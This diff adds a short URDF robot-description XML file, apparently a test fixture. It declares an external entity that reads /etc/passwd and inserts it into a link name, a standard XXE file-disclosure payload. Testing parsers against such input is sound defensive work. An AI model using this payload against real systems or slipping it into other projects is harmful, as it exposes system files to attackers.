@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE robot [
+  <!ENTITY secret SYSTEM "file:///etc/passwd">
+]>
+<robot name="leak">
+  <link name="&secret;"/>
+</robot>
